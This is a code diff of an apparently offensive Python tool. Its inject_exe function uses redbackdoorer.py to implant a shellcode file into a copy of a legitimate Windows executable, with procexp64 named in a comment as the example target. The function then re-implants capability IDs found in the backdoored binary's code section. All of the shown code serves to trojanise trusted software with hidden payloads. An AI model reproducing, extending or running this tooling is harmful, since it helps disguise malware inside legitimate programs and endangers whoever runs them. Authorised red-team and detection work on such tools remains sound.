@@ -1,11 +1,17 @@
 from helper import *
 import shutil
 import pprint
+
 from pehelper import *
 from model import *
+from project import project
 
 
-def inject_exe(shc_file, exe_in, exe_out, mode, exe_capabilities: ExeCapabilities):
+def inject_exe(shc_file: FilePath):
+    exe_in: FilePath = project.inject_exe_in
+    exe_out: FilePath = project.inject_exe_out
+    exe_capabilities: ExeCapabilities = project.exe_capabilities
+
     print("--[ Injecting: {} into: {} -> {} ]".format(
         shc_file, exe_in, exe_out
     ))
@@ -15,13 +21,13 @@ def inject_exe(shc_file, exe_in, exe_out, mode, exe_capabilities: ExeCapabilitie
 
     # inject shellcode into exe_out with redbackdoorer
     # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
-    subprocess.run([
+    run_process_checkret([
         "python3.exe",
         "redbackdoorer.py",
-        mode,
+        project.inject_mode,
         shc_file,
         exe_out
-    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    ])
 
     # get code section of exe_out
     code = get_code_section(exe_out)
@@ -30,7 +36,7 @@ def inject_exe(shc_file, exe_in, exe_out, mode, exe_capabilities: ExeCapabilitie
     # and re-implant it
     for cap in exe_capabilities.get_all().values():
         if not cap.id in code:
-            print("Not found, abort")
+            print("Capability ID {} not found, abort".format(cap.id))
             raise Exception()
         
         off = code.index(cap.id)
